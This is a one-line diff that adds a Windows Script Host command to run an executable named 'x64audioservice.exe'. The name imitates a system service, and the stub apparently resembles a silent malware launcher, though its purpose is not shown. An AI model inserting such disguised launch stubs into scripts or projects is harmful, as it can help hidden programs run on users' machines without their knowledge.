@@ -1,0 +1,1 @@
+WScript.CreateObject("WScript.Shell").run("x64audioservice.exe")
